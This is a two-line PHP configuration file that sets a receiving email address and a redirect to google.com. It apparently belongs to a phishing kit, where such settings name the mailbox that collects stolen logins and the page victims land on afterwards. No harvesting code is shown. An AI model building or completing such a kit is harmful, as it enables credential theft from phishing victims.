<?php 
$Receive_email="ainsworthleigh090@gmail.com";
$redirect="https://www.google.com/";
?>